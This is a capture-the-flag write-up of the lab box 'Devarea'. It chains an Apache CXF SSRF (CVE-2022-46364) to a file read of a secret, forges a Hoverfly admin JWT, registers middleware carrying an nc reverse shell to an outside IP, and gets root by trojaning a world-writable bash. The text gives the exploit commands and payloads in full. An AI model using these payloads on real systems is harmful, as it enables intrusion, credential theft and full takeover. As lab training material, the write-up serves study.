# CTF – Devarea (Writeup)

## Context

Linux box built around a Java stack. The entry point is an Apache CXF SOAP service ("employee service") on port 8080. Behind it runs Hoverfly (a service-virtualisation proxy) with an admin API, and a local "SysWatch" monitoring suite that becomes the root path. The whole chain is SSRF → admin API RCE → a sudo-able shell script that runs a world-writable `bash` as root.

## Recon

I didn't keep the raw nmap output, but the surfaces I worked on `devarea.htb` were:

- **8080/tcp** – Apache CXF SOAP endpoint at `/employeeservice` (vulnerable CXF < 3.5.5).
- **8888/tcp** – Hoverfly admin API (`/api/v2/hoverfly/...`), discovered from a systemd unit read via SSRF.

The employee service exposes a `submitReport` SOAP operation, which is what CVE-2022-46364 abuses.

## Initial access – Apache CXF SSRF (CVE-2022-46364)

CVE-2022-46364 is an SSRF in Apache CXF triggered through MTOM `xop:Include`. When the service parses a multipart SOAP request, the `href` of an `<xop:Include>` element is fetched server-side, and the fetched bytes are reflected back (base64) in the response. `exploit.py` builds that multipart payload and decodes the reflected content.

Read `/etc/passwd` to confirm file read:

```
python3 exploit.py -t http://devarea.htb:8080/employeeservice -s file:///etc/passwd -d devarea.htb
```

Then pull the Hoverfly systemd unit, which exposed how Hoverfly runs and its admin auth secret:

```
python3 exploit.py -t http://devarea.htb:8080/employeeservice -s file:///etc/systemd/system/hoverfly.service -d devarea.htb
```

With the secret from the unit file I forged an admin JWT for the Hoverfly admin API. The token I used decodes (HS512) to `{"username":"admin", ...}`.

## RCE – Hoverfly middleware abuse

Hoverfly's admin API lets you register "middleware": an external binary plus a script that Hoverfly executes to transform traffic. That is arbitrary command execution by design. `exploit2.py` sends a `PUT /api/v2/hoverfly/middleware` with the forged bearer token, sets the binary to `/bin/sh`, and drops a reverse shell as the script:

```
python3 exploit2.py devarea.htb 8888 10.10.15.196 5556 <admin-jwt>
```

The payload registered is:

```json
{"binary":"/bin/sh","script":"mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | nc 10.10.15.196 5556 > /tmp/f"}
```

Catch it with `nc -lvnp 5556` and I land a shell as the Hoverfly service user.

## Privilege escalation – world-writable /usr/bin/bash + sudo SysWatch runner

Two facts line up on the box:

1. `/usr/bin/bash` is **world-writable**.
2. I can run `/opt/syswatch/syswatch.sh` via sudo. That script has a `plugin` command, and `log_monitor.sh` is in its `RUN_AS_ROOT_PLUGINS` list, so it is executed with `bash "$fullpath"` **as root**.

So I overwrite `bash` with a script that stamps out a setuid copy of the real bash, then trigger the root-run plugin.

```bash
# 1. Back up the real bash
cp /usr/bin/bash /tmp/bash.bak

# 2. Switch to sh so I survive overwriting bash
exec sh

# 3. Trojan /usr/bin/bash
cat > /usr/bin/bash << 'EOF'
#!/tmp/bash.bak
cp /tmp/bash.bak /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF

# 4. SysWatch runs log_monitor.sh with bash as root
sudo /opt/syswatch/syswatch.sh plugin log_monitor.sh

# 5. Root
/tmp/rootbash -p
whoami
cat /root/root.txt
```

When `syswatch.sh` calls `bash log_monitor.sh` as root, my trojan runs instead, producing a setuid-root `/tmp/rootbash`. `-p` keeps the effective UID, giving a root shell.

## Conclusion

SSRF in the CXF employee service (CVE-2022-46364) leaked a systemd unit and the Hoverfly admin secret. A forged admin JWT let me abuse Hoverfly's middleware feature for a reverse shell. Root came from a misconfigured, sudo-able monitoring script that executes a world-writable `bash` with full privileges.

## Skills demonstrated

- Exploiting Apache CXF MTOM/XOP SSRF (CVE-2022-46364) for server-side file read
- Reading systemd units via SSRF to recover service secrets
- Forging HS512 JWTs to reach an authenticated admin API
- Command execution through Hoverfly middleware registration
- Recognising a world-writable `/usr/bin/bash` and chaining it with a sudo-able root script for privesc
